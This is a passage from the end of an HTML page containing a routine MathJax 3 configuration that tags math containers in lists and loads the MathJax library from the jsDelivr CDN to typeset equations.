              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
